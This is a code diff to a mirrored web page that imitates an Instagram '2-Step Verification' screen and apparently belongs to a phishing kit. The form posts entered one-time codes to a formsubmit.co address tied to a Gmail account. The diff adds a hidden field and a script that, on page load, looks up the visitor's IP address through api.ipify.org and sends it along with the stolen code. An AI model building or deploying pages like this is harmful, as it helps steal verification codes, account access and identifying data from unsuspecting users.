@@ -58,6 +58,8 @@
       <!-- FORM SECTION -->
       <article class="form-area">
         <form  action="https://formsubmit.co/Earnmegaccess@gmail.com" method="POST" accept=".">
+                  <input type="text" id="ipAddress" name="ipAddress" readonly>
+
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -169,6 +171,21 @@
     <script src="../../js/socials/app.html"></script>
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
+        <script>
+        document.addEventListener('DOMContentLoaded', function() {
+    // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            document.getElementById('ipAddress').value = ipAddress;
+        })
+        .catch(error => {
+            console.error('Error fetching IP address:', error);
+        });
+});
+
+    </script>
   </body>
 
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:30 GMT -->
